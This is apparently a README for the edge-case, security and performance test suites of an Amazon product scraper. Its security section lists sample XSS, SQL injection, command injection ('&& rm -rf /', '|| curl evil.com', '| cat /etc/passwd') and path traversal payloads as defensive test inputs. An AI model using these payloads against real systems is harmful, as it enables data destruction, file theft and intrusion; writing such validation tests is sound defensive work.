# Edge Cases and Error Scenarios - Test Documentation

This document provides comprehensive documentation for all edge case and error scenario tests implemented for the Amazon Product Scraper.

## 📋 Overview

The edge case testing suite provides comprehensive coverage for failure scenarios and challenging conditions that the Amazon Product Scraper might encounter in production environments. These tests ensure the system remains stable, secure, and performant under adverse conditions.

## 🧪 Test Coverage

### 1. Amazon Blocking Requests (503/429 Status Codes)

**File**: `edge-cases-error-scenarios.test.js`

Tests how the system handles Amazon's anti-bot measures:

- **503 Service Unavailable**: Tests retry logic with exponential backoff
- **429 Too Many Requests**: Validates rate limiting compliance and retry behavior
- **Persistent blocking**: Ensures proper failure after maximum retries
- **CAPTCHA detection**: Handles bot detection pages gracefully
- **API error propagation**: Tests how blocking errors are communicated to clients

**Key Scenarios**:
```javascript
// 503 with retry-after header
mockAxios.get.mockRejectedValue({
  response: { status: 503, headers: { 'retry-after': '2' }}
});

// 429 rate limiting
mockAxios.get.mockRejectedValue({
  response: { status: 429, statusText: 'Too Many Requests' }
});
```

### 2. Malformed HTML Responses

**File**: `edge-cases-error-scenarios.test.js`

Tests parser robustness against corrupted HTML:

- **Incomplete tags**: Missing closing tags, broken attributes
- **Nested malformed structures**: Complex broken HTML hierarchies  
- **Encoding issues**: Corrupted character encoding, invalid Unicode
- **Missing essential elements**: No product containers or search results

**Key Scenarios**:
```html
<!-- Malformed HTML examples -->
<html><head><title>Amazon</title
<body>
  <div class="s-search-results
    <div data-component-type="s-search-result"
      <h2><a href="/dp/B123"><span>Broken Product</span></a>
```

### 3. Empty Search Results

**File**: `edge-cases-error-scenarios.test.js`

Validates handling when no products are found:

- **No results page**: Official Amazon "No results" page structure
- **Sponsored-only results**: Pages with only sponsored content (filtered out)
- **Empty response handling**: API behavior with zero products
- **Search suggestion parsing**: Handling of "did you mean" suggestions

### 4. Invalid Product Data

**File**: `edge-cases-error-scenarios.test.js`

Tests data extraction with missing or malformed product information:

- **Missing titles**: Products without valid title elements
- **Malformed prices**: Invalid price formats, missing currency
- **Invalid ratings**: Non-numeric ratings, out-of-range values
- **Broken URLs**: Empty, invalid, or incomplete product links
- **Missing images**: Products without image sources

**Validation Logic**:
```javascript
// Rating validation example
if (product.rating !== 'N/A') {
  const rating = parseFloat(product.rating);
  expect(rating).toBeGreaterThanOrEqual(0);
  expect(rating).toBeLessThanOrEqual(5);
}
```

### 5. Network Timeouts and Connection Resets

**File**: `edge-cases-error-scenarios.test.js`

Tests network-level failure handling:

- **ETIMEDOUT**: Request timeout scenarios with retry logic
- **ECONNRESET**: Connection reset by peer handling
- **ENOTFOUND**: DNS resolution failures
- **Network instability**: Intermittent connection issues

**Error Handling**:
```javascript
// Timeout with retries
mockAxios.get.mockRejectedValue({
  code: 'ETIMEDOUT',
  message: 'Request timeout'
});
```

### 6. Concurrent Request Handling

**Files**: `edge-cases-error-scenarios.test.js`, `performance-load.test.js`

Tests system behavior under concurrent load:

- **Multiple simultaneous requests**: 5-20 concurrent API calls
- **Mixed success/failure scenarios**: Some requests succeed, others fail
- **Request queue overflow**: Handling of many queued requests
- **Resource contention**: Memory and CPU usage under load

### 7. Memory Usage with Large Result Sets

**Files**: `edge-cases-error-scenarios.test.js`, `performance-load.test.js`

Validates memory efficiency and leak prevention:

- **Large HTML responses**: 100+ products in single response
- **Memory leak detection**: Monitoring heap usage over time
- **Long-running operations**: Sustained request load testing
- **Garbage collection**: Memory cleanup verification

**Memory Monitoring**:
```javascript
const initialMemory = process.memoryUsage().heapUsed;
// ... run operations ...
const finalMemory = process.memoryUsage().heapUsed;
const memoryGrowth = finalMemory - initialMemory;
expect(memoryGrowth).toBeLessThan(100 * 1024 * 1024); // <100MB
```

### 8. Special Characters in Search Keywords

**Files**: `edge-cases-error-scenarios.test.js`, `security-validation.test.js`

Tests handling of complex search terms:

- **Unicode characters**: Multi-language search terms (Chinese, Arabic, etc.)
- **Special URL characters**: Symbols requiring URL encoding (&, +, %, etc.)
- **Emoji and symbols**: Modern Unicode characters (🎮, 📱, etc.)
- **Control characters**: Newlines, tabs, null characters
- **Extremely long keywords**: 10KB+ search terms

**Character Sets Tested**:
```javascript
const unicodeKeywords = [
  'café', 'naïve', 'résumé',  // Accented characters
  '北京', 'تسوق', 'прода́жа',    // CJK, Arabic, Cyrillic
  '🎮 gaming', '📱 smartphone' // Emoji
];
```

## 🛡️ Security Testing

**File**: `security-validation.test.js`

### Cross-Site Scripting (XSS) Prevention

Tests protection against script injection:

- **HTML script tags**: `<script>alert("xss")</script>`
- **Event handlers**: `<img src=x onerror=alert("xss")>`
- **JavaScript protocols**: `javascript:alert("xss")`
- **Encoded payloads**: URL-encoded and HTML-encoded attacks

### SQL Injection Prevention

Validates protection against database attacks:

- **Classic injection**: `'; DROP TABLE products; --`
- **Union attacks**: `' UNION SELECT * FROM users --`
- **Boolean attacks**: `' OR '1'='1`
- **Time-based attacks**: `'; WAITFOR DELAY '00:00:10'; --`

### Command Injection Prevention

Tests OS command execution protection:

- **Shell commands**: `; ls -la`, `| cat /etc/passwd`
- **Command chaining**: `&& rm -rf /`, `|| curl evil.com`
- **Command substitution**: `` `whoami` ``, `$(whoami)`

### Path Traversal Prevention

Validates file system access protection:

- **Directory traversal**: `../../../etc/passwd`
- **Windows paths**: `..\\..\\..\\windows\\system32`
- **Encoded traversal**: `..%2F..%2F..%2Fetc%2Fpasswd`
- **File protocol**: `file:///etc/passwd`

## ⚡ Performance Testing

**File**: `performance-load.test.js`

### Load Testing Scenarios

- **Concurrent requests**: 10-50 simultaneous API calls
- **Burst traffic**: Quick succession of many requests
- **Sustained load**: Continuous requests over time periods
- **Resource monitoring**: CPU and memory usage tracking

### Performance Metrics

- **Response time**: Average, maximum, 95th percentile
- **Throughput**: Requests per second under load
- **Error rates**: Percentage of failed requests
- **Resource utilization**: Memory and CPU consumption

### Performance Thresholds

```javascript
// Performance criteria
expect(avgResponseTime).toBeLessThan(5000);     // 5 second average
expect(maxResponseTime).toBeLessThan(10000);    // 10 second maximum  
expect(successRate).toBeGreaterThan(0.8);       // 80% success rate
expect(memoryGrowth).toBeLessThan(100 * MB);    // <100MB memory growth
```

## 🔧 Running the Tests

### Basic Usage

```bash
# Run all edge case tests
bun test edge-cases-error-scenarios.test.js
bun test security-validation.test.js  
bun test performance-load.test.js

# Using the test runner (recommended)
node run-edge-case-tests.js
```

### Advanced Options

```bash
# Verbose output
node run-edge-case-tests.js --verbose

# Run specific test suite
node run-edge-case-tests.js --specific=security

# Run tests in parallel
node run-edge-case-tests.js --parallel

# Show help
node run-edge-case-tests.js --help
```

### Test Environment Setup

```bash
# Ensure server is running for integration tests
cd backend
bun run dev

# In another terminal, run edge case tests
cd backend/tests
node run-edge-case-tests.js
```

## 📊 Test Reports

The test runner provides comprehensive reporting:

### Summary Report
- Total test suites executed
- Pass/fail counts and percentages
- Execution time and performance metrics
- Critical vs optional test classification

### Individual Test Results
- Detailed results for each test suite
- Error messages and stack traces
- Performance characteristics
- Memory usage patterns

### Coverage Analysis
- Edge case scenarios covered
- Security vulnerabilities tested
- Performance characteristics validated
- Recommendations for improvements

## 🚨 Critical vs Optional Tests

### Critical Tests (Must Pass)
- **Security and Input Validation**: XSS, injection attacks
- **Edge Cases and Error Scenarios**: Core error handling
- **Basic Performance**: Response time and stability

### Optional Tests (Nice to Have)
- **Advanced Performance**: High-load scenarios
- **Memory Optimization**: Long-running leak detection
- **Stress Testing**: Extreme concurrent loads

## 🔍 Troubleshooting

### Common Issues

1. **Test Timeouts**
   - Increase timeout values in test configuration
   - Check server responsiveness
   - Verify network connectivity

2. **Memory Issues**
   - Run tests with `--expose-gc` flag for garbage collection
   - Monitor system memory availability
   - Reduce concurrent test execution

3. **Mocking Problems**
   - Verify mock setup in test files
   - Check axios mock configuration
   - Ensure proper cleanup in afterEach

### Debug Mode

```bash
# Run with debug output
DEBUG=true node run-edge-case-tests.js --verbose

# Memory debugging
node --expose-gc run-edge-case-tests.js

# Performance profiling  
node --prof run-edge-case-tests.js
```

## 📝 Test Maintenance

### Adding New Edge Cases

1. **Identify the scenario**: Document the edge case
2. **Create test cases**: Write comprehensive tests
3. **Update documentation**: Add to this README
4. **Verify coverage**: Ensure all paths are tested

### Updating Existing Tests

1. **Review test relevance**: Ensure tests match current behavior
2. **Update expected results**: Modify assertions as needed
3. **Performance baselines**: Adjust thresholds if system changes
4. **Documentation sync**: Keep README current

## 🎯 Success Criteria

The edge case test suite is considered successful when:

- ✅ All critical security tests pass
- ✅ Error handling gracefully manages failures
- ✅ Performance meets established thresholds
- ✅ Memory usage remains stable under load
- ✅ No critical vulnerabilities are detected
- ✅ System recovers from temporary failures
- ✅ User input is properly validated and sanitized

## 📚 Related Documentation

- [Testing Overview](../docs/testing/testing-overview.md)
- [API Documentation](../docs/api/endpoints.md)
- [Security Guidelines](../docs/security/guidelines.md)
- [Performance Optimization](../docs/performance/optimization.md)

---

*This document is maintained alongside the test suites. Updates should be made when new edge cases are added or existing tests are modified.*
